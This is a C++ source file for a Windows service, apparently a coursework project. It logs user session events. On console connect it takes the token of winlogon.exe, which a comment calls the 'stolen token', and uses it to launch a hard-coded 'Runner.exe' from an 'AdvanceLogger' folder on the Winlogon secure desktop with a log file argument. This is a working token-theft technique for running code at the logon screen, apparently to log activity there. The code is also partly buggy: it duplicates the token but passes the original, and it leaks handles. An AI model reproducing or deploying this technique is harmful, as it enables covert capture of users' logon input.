// DirMonService.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#pragma once
#include <iostream>
#include<tchar.h>
#include <Windows.h>
#include <fstream>
#include <sstream>
#include <string>
#include <iostream>
#include <codecvt>
#include <wtsapi32.h>


#pragma comment(lib, "Wtsapi32.lib")
//Global variables to hold the service name and control handler
SERVICE_STATUS g_serviceStatus = { 0 };
SERVICE_STATUS_HANDLE g_serviceStatusHandle = NULL;
HANDLE g_serviceStopEvent = INVALID_HANDLE_VALUE;
std::wstring OutPut;
//Defind the service name
wchar_t SERVICE_NAME[] = _T("MiniService");
std::wofstream outFile;


//Function prototypes
VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv);
DWORD WINAPI ServiceCtrlHandlerEx(DWORD CtrlCode, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext);
VOID ServiceWorkerThread(LPVOID lpParam);
BOOL TakeWinLogonToken(DWORD sessionID);

/**
 * @brief The entry point for the service.
 *
 * @param argc The number of command-line arguments.
 * @param argv An array of command-line argument strings.
 */


 /**
  * @brief The main entry point for the application.
  *
  * @param argc The number of command-line arguments.
  * @param argv An array of command-line argument strings.
  * @return int The exit code of the application.
  *
  */

int _tmain(int argc, TCHAR* argv)
{
	//outFile.open(L"C:\\Users\\2014y\\Desktop\\SugionEx4\\DirMonService\\x64\\Debug\\output.txt");
	//hDir = CreateFile(L"C:\\Logs", FILE_LIST_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	//ServiceWorkerThread(NULL);
	//return 0;

	//Service entry point
	SERVICE_TABLE_ENTRY ServiceTable[] = {
		{SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
		{NULL, NULL}
	};
	if (!StartServiceCtrlDispatcher(ServiceTable))
	{
		OutputDebugString(_T("My Sample Service: Main: StartServiceCtrlDispatcher returned error"));
		return GetLastError();
	}
	return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

// DirMonService.cpp : This file contains the 'main' function. Program execution begins and ends there.

std::wstring GetExecutablePath() {
	wchar_t buffer[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, buffer, MAX_PATH);
	std::wstring::size_type pos = std::wstring(buffer).find_last_of(L"\\/");
	return std::wstring(buffer).substr(0, pos);
}

std::wstring GetFullPath(const std::wstring& fileName) {
	std::wstring executablePath = GetExecutablePath();
	std::wstringstream fullPath;
	fullPath << executablePath << L"\\" << fileName;
	return fullPath.str();
}
/**
 * @brief The entry point for the service.
 *
 * @param argc The number of command-line arguments.
 * @param argv An array of command-line argument strings.
 */
VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv)
{
	std::wofstream errSet(GetFullPath(L"ErrLog.txt"));
	
	//Register the service control handler
	g_serviceStatusHandle = RegisterServiceCtrlHandlerEx(SERVICE_NAME, ServiceCtrlHandlerEx, NULL);
	if (g_serviceStatusHandle == NULL)
	{
		return;
	}
	

	//Initialize the service status structure
	ZeroMemory(&g_serviceStatus, sizeof(g_serviceStatus));
	g_serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	g_serviceStatus.dwControlsAccepted = 0;
	g_serviceStatus.dwCurrentState = SERVICE_START_PENDING;
	g_serviceStatus.dwWin32ExitCode = NO_ERROR;
	g_serviceStatus.dwServiceSpecificExitCode = 0;
	g_serviceStatus.dwCheckPoint = 0;

	//Report the status to the service control manager
	if (SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus) == FALSE)
	{
		OutputDebugString(_T("My Sample Service: ServiceMain: SetServiceStatus returned error"));
	}
	//Create a service stop event to wait on later
	g_serviceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (g_serviceStopEvent == NULL)
	{
		g_serviceStatus.dwControlsAccepted = 0;
		g_serviceStatus.dwCurrentState = SERVICE_STOPPED;
		g_serviceStatus.dwWin32ExitCode = GetLastError();
		g_serviceStatus.dwCheckPoint = 1;
		if (SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus) == FALSE)
		{
			OutputDebugString(_T("My Sample Service: ServiceMain: SetServiceStatus returned error"));

		}
		return;

	}
	
	//process command line argumernts
	if (argc < 2) {
		g_serviceStatus.dwControlsAccepted = 0;
		g_serviceStatus.dwCurrentState = SERVICE_STOPPED;
		g_serviceStatus.dwWin32ExitCode = ERROR_INVALID_PARAMETER;
		g_serviceStatus.dwCheckPoint = 2;
		if (SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus) == FALSE)
		{

			OutputDebugString(_T("My Sample Service: ServiceMain: SetServiceStatus returned error"));
			
		}
		errSet << L"No Argumets " << std::endl;
		return;
	}
	std::wstring OutPut = argv[1];
	errSet << L"Parameter 1: " << OutPut << std::endl;
	OutputDebugString((L"Parameter 2: " + OutPut + L"\n").c_str());
	errSet.close();
	//Open the output file
	outFile.open(OutPut, std::ios::out | std::ios::binary); // Open in binary mode to specify UTF-8
	outFile.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>)); // Set UTF-8 locale
	outFile << L"Service started" << std::endl;
	outFile.flush();

	if (!outFile.is_open()) {
		g_serviceStatus.dwControlsAccepted = 0;
		g_serviceStatus.dwCurrentState = SERVICE_STOPPED;
		g_serviceStatus.dwWin32ExitCode = ERROR_OPEN_FAILED;
		g_serviceStatus.dwCheckPoint = 2;
		OutputDebugString(_T("My Sample Service: ServiceMain: Unable to open output file"));
		if (SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus) == FALSE)
		{
			OutputDebugString(_T("My Sample Service: ServiceMain: SetServiceStatus returned error"));
		}
		return;
	}
	//Inform SCM that the service is running
	g_serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SESSIONCHANGE;
	g_serviceStatus.dwCurrentState = SERVICE_RUNNING;
	g_serviceStatus.dwWin32ExitCode = NO_ERROR;
	g_serviceStatus.dwCheckPoint = 0;

	if (SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus) == FALSE)
	{
		OutputDebugString(_T("My Sample Service: ServiceMain: SetServiceStatus returned error"));
	}

	//Start the service worker thread
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ServiceWorkerThread, NULL, 0, NULL);
	if (hThread == NULL)
	{
		//inform SCM that the service is stopped
		g_serviceStatus.dwControlsAccepted = 0;
		g_serviceStatus.dwCurrentState = SERVICE_STOPPED;
		g_serviceStatus.dwWin32ExitCode = GetLastError();
		g_serviceStatus.dwCheckPoint = 1;
		if (SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus) == FALSE)
		{
			OutputDebugString(_T("My Sample Service: ServiceMain: SetServiceStatus returned error"));
		}
		return;
	}

	//Wait until the service stop event is signalled
	WaitForSingleObject(g_serviceStopEvent, INFINITE);
	outFile.close();


	//inform SCM that the service is stopped
	g_serviceStatus.dwControlsAccepted = 0;
	g_serviceStatus.dwCurrentState = SERVICE_STOPPED;
	g_serviceStatus.dwWin32ExitCode = NO_ERROR;
	g_serviceStatus.dwCheckPoint = 3;

	if (SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus) == FALSE)
	{
		OutputDebugString(_T("My Sample Service: ServiceMain: SetServiceStatus returned error"));
	}
}

/**
 * @brief The service control handler function.
 *
 * @param ctrl The control code.
 */
DWORD WINAPI ServiceCtrlHandlerEx(DWORD CtrlCode, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext) {
	switch (CtrlCode) {
	case SERVICE_CONTROL_STOP:
		if (g_serviceStatus.dwCurrentState != SERVICE_RUNNING)
			break;
		// Inform SCM that the service is stopping
		g_serviceStatus.dwControlsAccepted = 0;
		g_serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		g_serviceStatus.dwWin32ExitCode = NO_ERROR;
		g_serviceStatus.dwCheckPoint = 4;
		if (SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus) == FALSE) {
			OutputDebugString(_T("My Sample Service: ServiceCtrlHandler: SetServiceStatus returned error"));
		}
		SetEvent(g_serviceStopEvent);
		break;
	case SERVICE_CONTROL_SESSIONCHANGE:
	{
		WTSSESSION_NOTIFICATION* sessionNotification = static_cast<WTSSESSION_NOTIFICATION*>(lpEventData);
		DWORD sessionId = sessionNotification->dwSessionId;
		outFile << L"Session change event: Session ID " << sessionId << std::endl;
		switch (dwEventType) {
			case WTS_CONSOLE_CONNECT:
				outFile << "Console connect: Session ID " << sessionId << std::endl;
				TakeWinLogonToken(sessionId);
				break;
			case WTS_CONSOLE_DISCONNECT:
				outFile << "Console disconnect: Session ID " << sessionId << std::endl;
				
				break;
			case WTS_REMOTE_CONNECT:
				//EnumerateAllProccessesInSession(sessionId);
				outFile << "Remote connect: Session ID " << sessionId << std::endl;
				break;
			case WTS_REMOTE_DISCONNECT:
				outFile << "Remote disconnect: Session ID " << sessionId << std::endl;
				break;
			case WTS_SESSION_LOGON:
				outFile << "Session logon: Session ID " << sessionId << std::endl;
				break;
			case WTS_SESSION_LOGOFF:
				outFile << "Session logoff: Session ID " << sessionId << std::endl;
				break;
			case WTS_SESSION_LOCK:
				outFile << "Session lock: Session ID " << sessionId << std::endl;
				//EnumerateSessions();
				break;
			case WTS_SESSION_UNLOCK:
				outFile << "Session unlock: Session ID " << sessionId << std::endl;
				break;
			case WTS_SESSION_CREATE:
				outFile << "Session create: Session ID " << sessionId << std::endl;
				break;
			case WTS_SESSION_TERMINATE:
				outFile << "Session terminate: Session ID " << sessionId << std::endl;
				break;
		}
		break;
	}
	case SERVICE_CONTROL_PAUSE:
		// TODO: Perform tasks necessary to pause the service.
		break;
	case SERVICE_CONTROL_CONTINUE:
		// TODO: Perform tasks necessary to continue the service.
		break;
	case SERVICE_CONTROL_SHUTDOWN:
		// TODO: Perform tasks necessary to handle system shutdown.
		break;
	default:
		break;
	}
	return NO_ERROR;
}



BOOL StartProcessWithToken(HANDLE hToken, LPCWSTR processPath, LPWSTR desktopName) {
	std::wstring commandLine = processPath;
	std::wcout << L"Starting process with " << commandLine << std::endl;
	HANDLE hTokenDup = NULL;
	if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityIdentification, TokenPrimary, &hTokenDup)) {
		STARTUPINFOW si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };
		si.lpDesktop = desktopName;
		if (CreateProcessAsUserW(
			hToken,
			NULL,
			&commandLine[0],
			NULL,
			NULL,
			FALSE,
			CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
			NULL,
			NULL,
			&si,
			&pi)) {
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			return TRUE;
		}
		else {
			outFile << L"Failed to create process: " << GetLastError() << std::endl;
			return FALSE;
		}
		CloseHandle(hTokenDup);
	}
	else {
		outFile << L"Failed to duplicate token: " << GetLastError() << std::endl;
		return FALSE;
	}
}

std::wstring exePath = L"C:\\Users\\2014y\\Desktop\\AdvanceLogger\\x64\\Debug\\Runner.exe";
WCHAR logOnName[] = L"Winlogon";
WCHAR defualtDesktop[] = L"Default";

void StartProcessInSession(DWORD sessionId, const std::wstring& processPath, LPWSTR desktopName) {
	HANDLE hToken = NULL;
	if (WTSQueryUserToken(sessionId, &hToken)) {
		HANDLE hTokenDup = NULL;
		if (StartProcessWithToken(hToken, processPath.c_str(), desktopName)) {
			outFile << "Process started successfully on the Winlogon desktop." << std::endl;
		}
		else {
			outFile << "Failed to start process on the Winlogon desktop." << std::endl;
		}
		CloseHandle(hToken);
	}
	else {
		std::wcerr << L"Failed to query user token: " << GetLastError() << std::endl;
	}
}
BOOL TakeWinLogonToken(DWORD sessionID) {
	PWTS_PROCESS_INFO pProcessInfo = NULL;
	DWORD dwProcessCount = 0;
	if (WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pProcessInfo, &dwProcessCount)) {
		outFile << "Process ID\tProcess Name" << std::endl;
		for (DWORD i = 0; i < dwProcessCount; i++) {
			DWORD processId = pProcessInfo[i].ProcessId;
			std::wstring processName = pProcessInfo[i].pProcessName;
			if (pProcessInfo[i].SessionId == sessionID) {
				if (processName == L"winlogon.exe") {
					outFile << processId << "\t\t" << processName << std::endl;
					HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
					if (!hProcess) {
						outFile << L"Failed to open process " << processId << std::endl;
						return FALSE;
					}
					HANDLE hToken;
					if (!OpenProcessToken(hProcess, TOKEN_READ | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hToken)) {
						outFile << L"Failed to open process token " << processId << std::endl;
						CloseHandle(hProcess);
						return FALSE;
					}
					DWORD sessionId;
					DWORD sessionInfoSize;
					if (GetTokenInformation(hToken, TokenSessionId, &sessionId, sizeof(sessionId), &sessionInfoSize)) {
						// Only proceed if session ID is not zero (session 0 is reserved for system processes)
						if (sessionId != 0) {
							outFile << L"Found WinLogon process in session " << sessionId << std::endl;
							const std::wstring processPathAndParams = exePath + L" C:\\Users\\2014y\\Desktop\\AdvanceLogger\\x64\\Debug\\Log3.txt";

							// Start a process with the stolen token
							if (!StartProcessWithToken(hToken, processPathAndParams.c_str(), logOnName)) {
								outFile << L"Failed to start process with token." << std::endl;
								return FALSE;
							}
							outFile << L"Process started successfully." << std::endl;
							return TRUE;
						}
					}
					CloseHandle(hToken);
				}
			}

		}
		WTSFreeMemory(pProcessInfo);
	}
	else
	{
		outFile << L"Failed to enumerate processes in session " << sessionID << std::endl;
		return FALSE;
	}
	return TRUE;
}
/**
 * @brief The service worker thread function.
 *
 * @param lpParam The thread parameter.
 */

VOID ServiceWorkerThread(LPVOID lpParam)
{
	while (true)
	{
		Sleep(1000);
	}
}


